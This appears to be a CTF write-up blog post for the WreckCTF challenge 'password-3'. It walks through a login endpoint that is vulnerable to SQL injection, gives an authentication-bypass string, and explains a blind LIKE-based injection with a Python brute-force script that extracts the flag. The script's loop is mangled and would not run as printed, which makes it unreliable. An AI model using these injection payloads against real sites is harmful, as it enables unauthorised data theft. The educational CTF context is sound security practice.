---
layout: post
current: post
cover:  False
navigation: True
title: "password-3"
date: 2022-11-03 10:00:00
tags: [WRECKCTF]
class: post-template
subclass: 'post'
author: ZeroDayTea
---

A quick but interesting proof-of-concept demonstrating that security by obscurity does not and will never work. Even if you don't show reflected feedback from SQL commands, your database is still not safe. 

## The Challenge

We are presented with a standard login page looking mighty submissive and pwnable and containing only a single password field. Let's take a look at the server-side code:
```js
const crypto = require('crypto')
const database = require('better-sqlite3')
const express = require('express')
const app = express()

FLAG = process.env.FLAG ?? 'flag{testflag}'
const db = new database(':memory:')
const id = () => crypto.randomBytes(16).toString('hex')

app.use(express.static('public'))
app.use(express.json())

app.post('/password', (req, res) => {
    const password = (req.body.password ?? '').toString()
    const result = db.prepare(
        `SELECT password FROM passwords WHERE password='${password}';`
    ).get()

    if (result) res.json({
        success: true,
        message: (
            'Congrats on logging in! However, that\'s not enough... can you ' +
            'find the flag in the database this time?'
        ),
    })
    else res.json({ success: false })
})

db.exec(`
    CREATE TABLE passwords (
        password TEXT
    );

    INSERT INTO passwords (password) VALUES ('${id()}');
    INSERT INTO passwords (password) VALUES ('${id()}');
    INSERT INTO passwords (password) VALUES ('${id()}');
    INSERT INTO passwords (password) VALUES ('${FLAG}');
`)

  

app.listen(3000)
```

And here's what the JavaScript looks like on the frontend:
```js
form.addEventListener('submit', async (event) => {
	event.preventDefault();
	const input = document.querySelector('input[type="text"]');
	const response = await fetch('/password', {
	  method: 'POST',
	  headers: { 'content-type': 'application/json' },
	  body: JSON.stringify({ password: input.value }),

	})

	const result = await response.json()
	if (result.success) {
	  const content = document.querySelector('.content')
	  content.textContent = result.message;
	} else {
	  input.removeAttribute('style');
	  input.offsetWidth;
	  input.style.animation = 'shake 0.25s';
	}
  });
```

We can see that after clicking the `Login` button, our password field data will be sent over to the server endpoint `/password` and processed using the SQL select string ```
```SQL
SELECT password FROM passwords WHERE password='${password}';`.
```

Trying the standard authentication bypass string `admin' OR '1'='1';--` and logging in we are able to see the message 
 `Congrats on logging in! However, that's not enough... can you find the flag in the database this time?`

Looking more closely at the provided source code, we see:
```js
FLAG = process.env.FLAG ?? 'flag{testflag}'
...
db.exec(`
    CREATE TABLE passwords (
        password TEXT
    );

  

    INSERT INTO passwords (password) VALUES ('${id()}');
    INSERT INTO passwords (password) VALUES ('${id()}');
    INSERT INTO passwords (password) VALUES ('${id()}');
    INSERT INTO passwords (password) VALUES ('${FLAG}');
`)
```

The flag we are looking for is loaded in from an environment variable as is standard and INSERTed into the sqlite3 database. With seemingly no feedback from our SQL injections, however, we'll have to think of a more creative way to leak the passwords table in the database!

## Thinking About The Problem and SQL
One piece of feedback we do get is whether or not our SQL injection string did in fact run successfully and match something in the database or not. If we could somehow send a SQL injection that would return true if our input was similar to or LIKE one of the actual passwords in the database, we could bruteforce the password character by character.

Thankfully, SQL has the aptly named `LIKE` operator that does just this. We can use the LIKE operator in conjunction with the `%` wildcard character to match the flag in the database character by character, with the server returning a valid logged-in `true` response only if our guess is similar to the flag in the `passwords` table.

Our exploit string should look something along the lines of `' OR password LIKE '[guess]%` utilizing the previously selected `password` variable in the first half of the statement as well as the already provided ending single quote `'`; at the end of the statement.

## The Exploit
Here's a quick bruteforce script to run this exploit iteratively on the `/password` endpoint:

```python
import requests 

possibilities = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#Z^&*()" 

#flag = flag{whee_binary_search_sqli}
flag = "flag{"
url = "https://password-3.challs.wreckctf.com/password" 
payload = "" 

while True: 
    for char in possibilities: 
        print("Trying: " + flag + payload + char) 
        password = f"' OR password LIKE '{flag + payload + char}%" 
        print(password) 
        r = requests.post(url, json={"password": password}) 
        print(r.text) 
        if r.text.find("Congrats") != -1: 
            payload += char if payload[-1] == "}": 
            exit() 
        break
```

This implementation isn't entirely complete as it breaks at the last character and I had to manually add the ending curly brace `}` for the flag, but it nonetheless iterates through all the previous characters and gets the necessary part of the flag.

## Challenge Analysis
This was a quick and simple challenge, but quite an interesting one that highlights a key issue in many developers' intuition. Just because a hacker can't see the output of your SQL commands and other backend maneuvers does not necessarily mean they won't be able to expose sensitive information from the backend.

The challenge provided us with the source code for the server, making it almost immediately apparent what had to be done. However, even without source code, this kind of a vulnerability would be easy to catch given a form submission on any website or API running on a SQL database backend. It could also easily be *escalated* to read data from other tables on the database if not secured properly, leading to much larger-scale data leaks than a single flag in a single table.